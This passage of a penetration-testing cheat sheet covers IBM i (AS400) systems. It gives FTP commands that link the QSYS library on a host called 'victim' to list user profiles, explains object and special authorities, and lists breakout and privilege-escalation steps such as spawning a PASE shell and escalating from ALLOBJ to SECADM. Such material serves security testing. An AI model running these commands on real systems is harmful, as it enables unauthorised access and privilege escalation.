### FTP

Create a symbolic link to the QSYS library and list *.USRPRF

```ps1
open as400.victim.com
as400user
password
quote site namefmt 1
quote site listfmt 1
mkdir /test12345
quote rcmd ADDLNK OBJ('/qsys.lib')
NEWLNK('/test12345/qsys')
dir /test12345/qsys/*.usrprf
```

## Authority

In AS400 (IBM i), authority controls user access to system objects (libraries, files, programs, etc.). It ensures security by defining what users can do with specific objects.

* `*ALL`: Full access (read, write, delete, execute).
* `*CHANGE`: Modify but not delete.
* `*EXCLUDE`: No access.
* `*USE`: Read-only or execute.
* `*USERDEF`: Custom authority settings based on a user's specific needs.

## Special Authority

Special authority is used to specify the types of actions a user can perform on system resources. A user can be given one or more special authorities.

* `*ALLOBJ` special authority: All-object (`*ALLOBJ`) special authority allows the user to access any resource on the system whether private authority exists for the user.
* `*SECADM` special authority: Security administrator (`*SECADM`) special authority allows a user to create, change, and delete user profiles.
* `*JOBCTL` special authority: The Job control (`*JOBCTL`) special authority allows a user to change the priority of jobs and of printing, end a job before it has finished, or delete output before it has printed. `*JOBCTL` special authority can also give a user access to confidential spooled output, if output queues are specified `OPRCTL(*YES)`.
* `*SPLCTL` special authority: Spool control (`*SPLCTL`) special authority allows the user to perform all spool control functions, such as changing, deleting, displaying, holding and releasing spooled files.
* `*SAVSYS` special authority: Save system (`*SAVSYS`) special authority gives the user the authority to save, restore, and free storage for all objects on the system, regardless of whether the user has object existence authority to the objects.
* `*SERVICE` special authority: Service (`*SERVICE`) special authority allows the user to start system service tools using the STRSST command. This special authority allows the user to debug a program with only `*USE` authority to the program and perform the display and alter service functions. It also allows the user to perform trace functions.
* `*AUDIT` special authority: Audit (`*AUDIT`) special authority gives the user the ability to view and change auditing characteristics.
* `*IOSYSCFG` special authority: System configuration (`*IOSYSCFG`) special authority gives the user the ability to change how the system is configured. Users with this special authority can add or remove communications configuration information, work with TCP/IP servers, and configure the internet connection server (ICS). Most commands for configuring communications require `*IOSYSCFG` special authority.

```ps1
# Print users with special authorities
PRTUSRPRF TYPE(*ALL) SELECT(*SPCAUT) SPCAUT(*ALL)

# Print rights on a library object
DSPOBJAUT OBJ(MYLIB) OBJTYPE(*LIB)
```

## Privilege Escalation

### Initial Program Breakout

* Click "`Attn`" button. The attention interrupt key (ATTN) allows the authenticated user to interrupt/end a process and display a menu with additional functions.
* Press `F9` to run commands

```ps1
# Spawn a PASE shell
CALL QP2TERM

# Execute a script
CALL QP2SHELL PARM('/QOpenSys/usr/bin/sh' + '/tmp/scr')
```

### From ALLOBJ to SECADM

* Query users informations:

    ```c
    DSPUSRPRF USRPRF(*ALL) TYPE(*BASIC) OUTPUT(*OUTFILE) OUTFILE(PENTEST/USERDB)
    ```

* Create a CL script to escalate privilege and compile it with `STRPDM` (output is `PRIVESC`)
* Call the generated PGM (program object): `CALL PENTEST/PRIVESC USERWITHSECADM`
